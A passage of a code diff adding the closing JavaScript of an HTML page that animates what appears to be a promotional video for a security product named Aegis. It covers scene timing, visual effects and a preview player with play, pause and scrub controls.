+    $('dlbar').style.background = held ? 'var(--warning)' : 'var(--accent)';
+    const st = $('dlstate');
+    st.innerHTML = held ? `${ic('shield', 18, 2.4)} Held by Aegis` : 'Downloading';
+    st.style.color = held ? 'var(--accent)' : 'var(--ink-muted)';
+    st.style.borderColor = held ? 'var(--accent)' : 'var(--border-strong)';
+    st.style.background = held ? 'var(--accent-soft)' : 'transparent';
+    $('dlcard').style.borderColor = held ? 'rgba(80,230,255,.6)' : '';
+    $('dlcard').style.boxShadow = held ? 'var(--elev-card), var(--glow-md)' : '';
+    $('dlicon').style.color = held ? 'var(--accent)' : 'var(--ink)';
+    let h = '';
+    if (t > 42.5) for (let i = 0; i < 8; i++) { const ph = ((t - 42.5) * 1.2 + i / 8) % 1; h += `<div style="position:absolute;left:${ph * 236}px;top:-3px;width:10px;height:10px;border-radius:50%;background:#50e6ff;box-shadow:0 0 12px #50e6ff;opacity:${Math.sin(ph * 3.14)}"></div>`; }
+    $('flow').innerHTML = h;
+  }
+  // S7 chips split, brand glows
+  if (t > 46 && t < 60.5) {
+    const kc = E.io(P(t, 47.5, 48.4));
+    const ca = P(t, 46.9, 47.2) * (1 - P(t, 48.3, 48.5));
+    tf($('chipA'), { o: ca, x: lerp(0, -440, kc), y: lerp(0, 160, kc), s: lerp(1, .7, kc) });
+    tf($('chipB'), { o: ca, x: lerp(0, 440, kc), y: lerp(0, 160, kc), s: lerp(1, .7, kc) });
+    document.querySelectorAll('#s7 .brandname').forEach(b => {
+      const a = +b.dataset.glow, k = P(t, a, a + .3) * (1 - P(t, a + 1.8, a + 2.4) * .6);
+      b.style.color = k > .05 ? `color-mix(in srgb, #50e6ff ${k * 100}%, #e6f3fb)` : '';
+      b.style.textShadow = k > .05 ? `0 0 ${24 * k}px rgba(80,230,255,${.7 * k})` : '';
+    });
+    const nf = Math.max(0, 1 - Math.abs(t - 53.3) * 1.6);
+    document.querySelectorAll('#s7 .netoff').forEach(n => n.style.boxShadow = nf ? `0 0 ${30 * nf}px rgba(255,107,128,${nf})` : '');
+    ['pA', 'pB'].forEach((id, i) => { const vt = i ? 57.4 : 55.6; const k = Math.max(0, 1 - Math.abs(t - vt - .3) * 1.2); $(id).style.borderColor = k > .02 ? `rgba(255,107,128,${.3 + .6 * k})` : ''; });
+  }
+  // S8 merge + ladder
+  if (t > 59.5 && t < 67.5) {
+    const m = E.in(P(t, 60.6, 61.2));
+    const vis = 1 - P(t, 61.15, 61.25);
+    tf($('cA'), { o: P(t, 60.0, 60.3) * vis, x: lerp(0, 215, m), y: 0 });
+    tf($('cB'), { o: P(t, 60.0, 60.3) * vis, x: lerp(0, -215, m), y: 0 });
+    const ag = E.back(P(t, 61.2, 61.7));
+    tf($('agree'), { o: P(t, 61.2, 61.4), s: .85 + .15 * ag });
+    flash.style.opacity = Math.max(0, .6 - Math.abs(t - 61.25) * 2.5);
+    tf($('mkRules'), { o: P(t, 62.6, 62.9) * (1 - .5 * P(t, 64.2, 64.6)), x: -20 * (1 - P(t, 62.6, 62.9)) });
+    const lift = E.io(P(t, 63.4, 64.4));
+    $('liftbar').style.height = (lift * 112) + 'px';
+    $('liftbar').style.top = (96 + 112 - lift * 112 + 8) + 'px';
+    tf($('mkAI'), { o: P(t, 63.4, 63.6), y: lerp(112, 0, lift) });
+    tf($('never2'), { o: P(t, 65.0, 65.4), x: -20 * (1 - P(t, 65.0, 65.4)) });
+  }
+  // S9 code highlights + slow push
+  if (t > 66.5 && t < 75) {
+    document.querySelectorAll('#s9 .cl[data-hl]').forEach(l => {
+      const a = +l.dataset.hl, k = E.out(P(t, a, a + .5));
+      l.querySelector('.hlb').style.transform = `scaleX(${k})`;
+      l.style.borderLeftColor = k > .05 ? 'var(--danger)' : 'transparent';
+      l.style.color = k > .5 ? '#ffd0d7' : '';
+      const tag = l.querySelector('.tag'); if (tag) tf(tag, { o: P(t, a + .2, a + .4), s: .5 + .5 * E.back(P(t, a + .2, a + .5)) });
+    });
+    const z = E.io(P(t, 67, 74.5));
+    $('rep').style.transform = `scale(${1 + .035 * z}) translate(${-12 * z}px, ${-6 * z}px)`;
+  }
+  // S10 typing indicator
+  if (t > 74 && t < 81.5) {
+    const ty = $('typing'); ty.style.opacity = t > 76.2 && t < 77.3 ? 1 : 0;
+    ty.querySelectorAll('.tdot').forEach((d, i) => { d.style.cssText = `display:inline-block;width:12px;height:12px;border-radius:50%;background:#9aa7b3;opacity:${.35 + .65 * Math.max(0, Math.sin(t * 8 - i * .9))}`; });
+  }
+  // S11 ring, fn key, mini panel
+  if (t > 80.5 && t < 87.5) {
+    const C = 2 * Math.PI * 125, k = E.expo(P(t, 81.6, 83.2)) * .92;
+    $('ring').style.strokeDasharray = `${C * k} ${C}`;
+    const press = t > 81.45 && t < 81.65;
+    $('fnkey').style.transform = press ? 'translateY(6px)' : '';
+    $('fnkey').style.boxShadow = press ? '0 2px 0 #0a121b, 0 0 30px rgba(80,230,255,.6)' : '';
+    $('fnkey').style.borderColor = t > 81.45 ? 'var(--accent)' : '';
+    const mk = E.back(P(t, 81.7, 82.2));
+    tf($('mini'), { o: P(t, 81.7, 81.9), y: -30 * (1 - mk), s: .94 + .06 * mk });
+    $('mini').style.transformOrigin = '85% 0';
+    $('dash').style.filter = t > 81.7 ? `brightness(${1 - .25 * P(t, 81.7, 82.2)})` : '';
+    $('mbshield').style.filter = t > 81.5 && t < 82.3 ? 'drop-shadow(0 0 8px #50e6ff)' : '';
+  }
+  // S12 outro
+  if (t > 86.5) {
+    drawShield(SH2, t, 87.1);
+    tf($('s12shield'), { o: P(t, 87.0, 87.2), s: .9 + .1 * E.out(P(t, 87, 88)) });
+    rings($('rings2'), t, 88.3, 91, 690, 410, 1.3);
+    black.style.opacity = E.io(P(t, 94.6, 96));
+  }
+}
+
+function scenesVisibility(t) {
+  for (const s of S) {
+    const vis = t >= s.s - .3 && t <= s.e + .3 && (!window.__only || window.__only.includes(s.id));
+    s.el.style.display = vis ? 'block' : 'none';
+    if (!vis) continue;
+    const inK = s.s === 0 ? 1 : E.out(P(t, s.s - .1, s.s + .45));
+    const outK = s.e >= DUR ? 0 : P(t, s.e - .3, s.e + .2);
+    tf(s.el, { o: inK * (1 - outK), s: (1.04 - .04 * inK) * (1 - .05 * outK), b: 12 * outK + 8 * (1 - inK) });
+  }
+  // scan sweep at each boundary
+  let sw = null;
+  for (const b of BOUNDS) if (t > b - .3 && t < b + .3) sw = b;
+  if (sw != null) { const k = P(t, sw - .3, sw + .3); sweep.style.top = (k * 1080) + 'px'; sweep.style.opacity = Math.sin(k * Math.PI); } else sweep.style.opacity = 0;
+}
+
+function render(t) {
+  t = clamp(t, 0, DUR);
+  drawBg(t);
+  scenesVisibility(t);
+  entrances(t);
+  counters(t);
+  scenes(t);
+}
+
+window.__seek = t => new Promise(res => { render(t); requestAnimationFrame(() => requestAnimationFrame(res)); });
+window.__duration = DUR;
+window.__render = render; // synchronous, for cut.mjs
+window.__ready = true;
+
+/* preview player */
+const isRender = new URLSearchParams(location.search).has('render');
+if (isRender) document.body.classList.add('render');
+function fit() {
+  if (isRender) { stage.style.transform = ''; return; }
+  const s = Math.min(innerWidth / 1920, (innerHeight - 50) / 1080);
+  stage.style.transform = `scale(${s})`;
+  stage.style.left = (innerWidth - 1920 * s) / 2 + 'px';
+  stage.style.top = (innerHeight - 50 - 1080 * s) / 2 + 'px';
+}
+addEventListener('resize', fit); fit();
+const audio = $('audio'), playBtn = $('play'), scrub = $('scrub'), clock = $('clock');
+let playing = false, t0 = 0, base = 0, cur = +(new URLSearchParams(location.search).get('t') || 0);
+function loop(now) {
+  if (!playing) return;
+  cur = base + (now - t0) / 1000;
+  if (cur >= DUR) { cur = DUR; playing = false; playBtn.textContent = 'Play'; }
+  render(cur); scrub.value = cur; clock.textContent = cur.toFixed(2);
+  requestAnimationFrame(loop);
+}
+function play() { if (cur >= DUR) cur = 0; playing = true; base = cur; t0 = performance.now(); playBtn.textContent = 'Pause'; try { audio.currentTime = cur; audio.play().catch(() => {}); } catch {} requestAnimationFrame(loop); }
+function pause() { playing = false; playBtn.textContent = 'Play'; try { audio.pause(); } catch {} }
+playBtn.onclick = () => playing ? pause() : play();
+scrub.oninput = () => { pause(); cur = +scrub.value; render(cur); clock.textContent = cur.toFixed(2); };
+addEventListener('keydown', e => { if (e.code === 'Space') { e.preventDefault(); playing ? pause() : play(); } });
+document.fonts.ready.then(() => render(cur));
+</script>
+</body>
+</html>
